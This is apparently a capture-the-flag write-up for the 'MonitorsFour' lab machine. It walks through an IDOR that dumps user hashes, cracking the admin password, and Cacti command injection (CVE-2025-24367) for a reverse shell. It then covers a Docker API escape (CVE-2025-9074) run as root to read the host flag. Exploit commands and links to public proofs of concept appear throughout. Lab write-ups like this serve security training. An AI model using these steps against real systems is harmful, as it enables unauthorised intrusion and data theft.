# Room: MonitorsFour
Difficulty: Easy

Before doing anything else, I scanned for open ports using:
``` bash
nmap -sC -sV TARGET_IP -T4
```
- -sC = default scripts
- -sV = service detection
- -T4 = faster/aggressive scan 

Result:
``` bash
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx
|_http-title: Did not follow redirect to http://monitorsfour.htb/
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows
```
I added monitorsfour.htb to my /etc/hosts.
``` bash
echo "TARGET_IP monitorsfour.htb" | sudo tee -a /etc/hosts
```
Upon visiting the website, nothing suspicious appeared, but there was a login panel. 
I also started fuzzing for hidden directories but found nothing, so I proceeded to enumerate subdomains.

Result:
``` bash
cacti
```
Then I added it again to my /etc/hosts
``` bash
echo "TARGET_IP cacti.monitorsfour.htb" | sudo tee -a /etc/hosts
```
Upon visiting the subdomain, I found a login panel and identified the version of Cacti as v1.2.28.

I tried the default credentials 
``` bash
admin:admin
```
but it didn’t work.

I went back to monitorsfour.htb and viewed the page source. I found an endpoint:
``` bash
/api/v1/auth
```
I fuzzed /api/v1/ to discover available endpoints and found:
``` bash
/api/v1/users
```
Visiting it returned:
``` html
{"error":"Missing token parameter"}
```
I then tried adding:
``` html
?token=1
```
Which returned:
``` bash
{"Invalid or missing token"}
```
I then tried changing the value to 0, and it dumped all users, resulting in an IDOR vulnerability.

Result:
``` json
[{"id":2,"username":"admin","email":"admin@monitorsfour.htb","password":"REDACTED","role":"super user","token":"8024b78f83f102da4f","name":"Marcus Higgins","position":"System Administrator","dob":"1978-04-26","start_date":"2021-01-12","salary":"320800.00"},
{"id":5,"username":"mwatson","email":"mwatson@monitorsfour.htb","password":"69196959c16b26ef00b77d82cf6eb169","role":"user","token":"0e543210987654321","name":"Michael Watson","position":"Website Administrator","dob":"1985-02-15","start_date":"2021-05-11","salary":"75000.00"},
{"id":6,"username":"janderson","email":"janderson@monitorsfour.htb","password":"2a22dcf99190c322d974c8df5ba3256b","role":"user","token":"0e999999999999999","name":"Jennifer Anderson","position":"Network Engineer","dob":"1990-07-16","start_date":"2021-06-20","salary":"68000.00"},{"id":7,"username":"dthompson","email":"dthompson@monitorsfour.htb","password":"8d4a7e7fd08555133e056d9aacb1e519","role":"user","token":"0e111111111111111","name":"David Thompson","position":"Database Manager","dob":"1982-11-23","start_date":"2022-09-15","salary":"83000.00"}]
```
### My Explanation:

The website relies on a token parameter for authentication. The backend likely uses something like:
``` sql
SELECT * FROM users WHERE token = $token;
```
When using token=0, instead of properly rejecting the request, the application likely falls back to returning all users due to improper validation or logic handling. This results in unauthorized data exposure (IDOR).

The admin hash was interesting because it was MD5, so I cracked it using an online tool (CrackStation https://crackstation.net/).

On monitorfour.htb

I logged in using:
``` bash
admin:REDACTED
```
There was nothing useful on monitorsfour.htb, so I went back to cacti.monitorsfour.htb.

I tried the same credentials but it failed. Since we know that the admin is Marcus Higgins, I tried:
``` bash
marcus:REDACTED
```
and it worked.

I researched the Cacti version and found CVE-2025-24367.

### Summary of Vulnerability (CVE-2025-24367):

An authenticated user can abuse graph creation and template functionality to create arbitrary PHP files in the web root, leading to remote code execution.

### Core Issue:

Cacti attempts to sanitize input using escapeshellarg, but it fails to filter newline characters (\n or %0a).

Because of this, an attacker can inject additional commands into the rrdtool execution via the right_axis_label parameter.

This allows writing a malicious PHP file (webshell) into the web root.

Using this public exploit, I gained a reverse shell:
https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC/blob/main/exploit.py

Now I am:
``` bash
www-data
```
I grabbed the user flag at:
``` bash
/home/marcus/user.txt
```
Upon further investigation, I ran:
``` bash
ls -la /
```
and found:
``` bash
.dockerenv
```
This convince that i am inside a Docker container

To confirm, I ran:
``` bash
ip a
```
and saw:
``` bash
172.18.0.3/16
```
This confirmed that I am inside a Docker container.

I transferred deepce.sh to the target machine. This is a tool used for Docker enumeration and escape checks.
Result:
``` bash
[+] Docker API exposed ...... Yes (192.168.65.7:2375)
[+] └── CVE-2025-9074 ....... Yes
```
Now that we know the vulnerability CVE-2025-9074:

I used this public exploit:
https://github.com/BridgerAlderson/CVE-2025-9074-PoC

### My Explanation:

Since the Docker API is exposed without authentication, it can be accessed over HTTP.

The Docker daemon runs as root, so if we gain control over it, we effectively gain root access on the host.

### The exploit works by:

Creating a new container via Docker API (/containers/create)

Mounting the host filesystem using /:/host_root

Executing commands inside the container with access to the host filesystem

This bypasses container isolation.

### Exploitation:

1st attempt:
``` bash
bash ./cve-2025-9074.sh 192.168.65.7 id
```
Result:
``` bash
uid=0(root) gid=0(root)
```
2nd attempt:
``` bash
bash ./cve-2025-9074.sh 192.168.65.7 'ls -la /'
```
Result:
``` bash
/host_root
```
This represents the host filesystem.
Since the target OS is Windows, the root flag is located at:
``` bash
/host_root/mnt/host/c/Users/Administrator/Desktop/root.txt
```
3rd attempt:
``` bash
bash ./cve-2025-9074.sh 192.168.65.7 'cat /host_root/mnt/host/c/Users/Administrator/Desktop/root.txt'
```
Result:
``` bash
6636**************************
```
